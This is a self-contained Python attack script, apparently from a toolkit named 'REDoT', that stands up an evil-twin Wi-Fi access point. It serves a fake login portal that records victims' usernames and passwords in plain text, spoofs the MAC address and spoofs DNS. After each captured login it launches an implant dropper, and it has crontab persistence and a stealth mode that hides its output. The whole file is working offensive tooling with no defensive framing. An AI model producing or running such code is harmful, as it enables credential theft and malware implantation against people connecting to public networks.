#!/usr/bin/env python3
# REDoT: Evil Twin + Credential Harvester + Implant Dropper (Self-Contained)

import argparse, os, signal, sys, time, random, subprocess
from threading import Thread
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from socketserver import TCPServer

PORT = 8080
CAPTIVE_FOLDER = "captive_portal"
PHISH_PAGE = os.path.join(CAPTIVE_FOLDER, "index.html")
PHP_LOGGER = os.path.join(CAPTIVE_FOLDER, "login.php")
CRED_LOG = os.path.join(CAPTIVE_FOLDER, "creds.txt")
LOG_FILE = "results/wifi_attack.log"
IMPLANT_SCRIPT = "implant_dropper.py"
TARGETS = []
attack_active = True

def log(msg):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    print(msg)

def ensure_structure():
    os.makedirs(CAPTIVE_FOLDER, exist_ok=True)
    if not os.path.exists(PHISH_PAGE):
        with open(PHISH_PAGE, "w") as f:
            f.write("""<html><body><h2>Wi-Fi Login</h2>
<form method="POST" action="login.php">
<input type="text" name="user" placeholder="Username"/><br/>
<input type="password" name="pass" placeholder="Password"/><br/>
<input type="submit" value="Login"/>
</form></body></html>""")
    if not os.path.exists(PHP_LOGGER):
        with open(PHP_LOGGER, "w") as f:
            f.write("""<?php
file_put_contents("creds.txt", date('c')." | ".$_POST['user']." | ".$_POST['pass']."\\n", FILE_APPEND);
?>""")
    open(CRED_LOG, "a").close()

def spoof_mac(interface):
    mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
    os.system(f"ip link set {interface} down")
    os.system(f"macchanger -m {mac} {interface} >/dev/null 2>&1")
    os.system(f"ip link set {interface} up")
    log(f"[+] MAC spoofed: {mac}")

def start_ap(ssid, iface):
    conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wmm_enabled=0"""
    with open("hostapd.conf", "w") as f:
        f.write(conf)
    log(f"[*] Starting Evil Twin AP: {ssid} on {iface}")
    subprocess.Popen("hostapd hostapd.conf", shell=True)

def serve_portal():
    class PortalHandler(SimpleHTTPRequestHandler):
        def do_POST(self):
            if self.path.endswith("login.php"):
                length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(length).decode()
                creds = parse_qs(post_data)
                user = creds.get("user", [""])[0]
                pw = creds.get("pass", [""])[0]
                entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {user} | {pw}\n"
                with open(CRED_LOG, "a") as f:
                    f.write(entry)
                log(f"[+] Credentials captured: {user}:{pw}")
                drop_implant()
                self.send_response(302)
                self.send_header('Location', '/')
                self.end_headers()
            else:
                super().do_GET()

    os.chdir(CAPTIVE_FOLDER)
    TCPServer.allow_reuse_address = True
    httpd = TCPServer(('', PORT), PortalHandler)
    log(f"[*] Captive portal served on port {PORT}")
    httpd.serve_forever()

def dns_spoof():
    log("[*] Starting DNS spoofing (redirect all domains to portal)...")
    os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
    os.system("dnsspoof -i wlan0mon")

def drop_implant():
    if os.path.exists(IMPLANT_SCRIPT):
        log("[+] Triggering implant dropper...")
        subprocess.Popen(["python3", IMPLANT_SCRIPT])

def install_cron_persistence():
    script = os.path.abspath(__file__)
    cron_line = f"@reboot python3 {script} --target \"{TARGETS[0]}\" --iface wlan0mon --stealth\n"
    os.system(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -')
    log("[+] Persistence installed via crontab")

def cleanup():
    global attack_active
    attack_active = False
    log("[!] Cleaning up...")
    os.system("pkill hostapd")
    os.system("pkill dnsspoof")
    os.system("iptables -F")
    os.system("iptables -t nat -F")
    sys.exit(0)

def signal_handler(sig, frame):
    cleanup()

def main():
    parser = argparse.ArgumentParser(description="REDoT Evil Twin Payload Injector")
    parser.add_argument('--target', required=True, help="Target SSID")
    parser.add_argument('--iface', default="wlan0mon", help="Wireless interface")
    parser.add_argument('--stealth', action='store_true', help="Enable stealth mode (no logs)")
    parser.add_argument('--persist', action='store_true', help="Install persistence")
    parser.add_argument('--dns', action='store_true', help="Enable DNS spoofing")
    parser.add_argument('--spoofmac', action='store_true', help="Spoof MAC address")
    args = parser.parse_args()

    global TARGETS
    TARGETS = [args.target]

    if args.stealth:
        sys.stdout = open(os.devnull, 'w')

    signal.signal(signal.SIGINT, signal_handler)
    ensure_structure()

    if args.spoofmac:
        spoof_mac(args.iface)
    if args.persist:
        install_cron_persistence()

    ap_thread = Thread(target=start_ap, args=(args.target, args.iface))
    portal_thread = Thread(target=serve_portal)
    ap_thread.start()
    portal_thread.start()

    if args.dns:
        dns_thread = Thread(target=dns_spoof)
        dns_thread.start()

    while attack_active:
        time.sleep(2)

if __name__ == "__main__":
    main()
